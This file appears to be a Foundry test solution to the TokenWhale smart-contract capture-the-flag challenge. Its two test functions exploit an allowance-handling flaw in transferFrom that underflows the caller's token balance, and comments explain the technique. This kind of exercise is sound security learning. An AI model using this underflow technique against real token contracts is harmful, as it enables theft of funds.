// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TokenWhale.sol";

contract TokenWhaleTest is Test {
    TokenWhale public tokenWhale;
    ExploitContract public exploitContract;
    // Feel free to use these random addresses
    address constant Alice = address(0x5E12E7);
    address constant Bob = address(0x5311E8);
    address constant Pete = address(0x5E41E9);

    function setUp() public {
        // Deploy contracts
        tokenWhale = new TokenWhale(address(this));
        exploitContract = new ExploitContract(tokenWhale);
    }

    // Use the instance tokenWhale and exploitContract
    // Use vm.startPrank and vm.stopPrank to change between msg.sender
    function testExploit() public {
        // Put your solution here
        // I am player.
        // allow Alice to send 1000 tokens.
        tokenWhale.approve(Alice, 1000); 
        vm.startPrank(Alice);
        // Alice transfer 1 tokens to Bob. 
        // Because there is no check of msg.sender(Alice).
        // The banlanceOf Alice is underflow to uint256.max.
        tokenWhale.transferFrom(address(this), Bob, 1);
        tokenWhale.transfer(address(this), 1000000);
        _checkSolved();
    }

    function testExploit2() public {
        // Put your solution here
        // I am player.
        // allow Alice to send 1000 tokens.
        vm.startPrank(Alice);
        // Alice approve me 1000 tokens
        tokenWhale.approve(address(this), 1); 
        vm.startPrank(address(this));
        // I transfer all tokens to Alice. The balance of mine is 0.
        tokenWhale.transfer(Alice, 1000);
        // When I call this , there is no check to msg.sender.
        // then the balanceOf(I) is underflow.
        tokenWhale.transferFrom(Alice, Bob, 1);
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenWhale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
